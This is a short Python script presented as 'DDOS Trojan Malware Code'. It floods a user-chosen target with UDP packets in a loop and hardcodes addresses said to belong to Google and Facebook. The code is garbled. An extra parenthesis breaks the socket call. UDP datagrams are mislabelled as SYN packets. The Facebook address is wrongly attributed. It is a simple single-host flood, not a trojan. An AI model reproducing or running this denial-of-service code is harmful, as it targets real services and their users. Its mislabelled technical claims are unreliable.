import os, random, socket, struct

def ddostroj(target, port=random.randint(2100, 3499), packets=5000, timeout=8):
    """
    DDOS Trojan Malware Code (Python)
    """
    try:
        # --- Socket Setup ---
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM))
        s.settimeout(timeout)

        # --- Target Data ---
        if target == "google":
            target_address = "142.250.69.1" # google DNS server A record
        elif target == "facebook":
            target_address = "142.250.69.3" # facebook DNS server A record
        else:
            target_address = target

        # --- Packet Generation Loop ---
        counter = 0
        while True:
            try:
                s.sendto(b"\x45\xFC\xED\x82\xC9", (target_address, port)) # SYN Packet - No ACK needed
                counter += 1
                print(f"Packet Sent: {counter} | Target: {target} Port: {port}")
                if counter > packets:
                    break
            except socket.timeout:
                pass

    except (socket.error, ConnectionRefusedError) as e:
        print("--- ERROR ---",e)
    finally:
        s.close()

def main():
    # Replace "google" or "facebook" with the target domain
    target_domain = input("Enter Target Domain (e.g., google): ")
    
    # --- Triggering Code ---
    try:
        print("\n--- DDOS Trojan Started ---")
        ddostroj(target_domain)
        print("\n--- DDOS Attack Initiated! ---")

    except KeyboardInterrupt:
        print("\n--- User Stopped Attack. ---")
    
# --- Execution ---
if __name__ == "__main__":
    main()
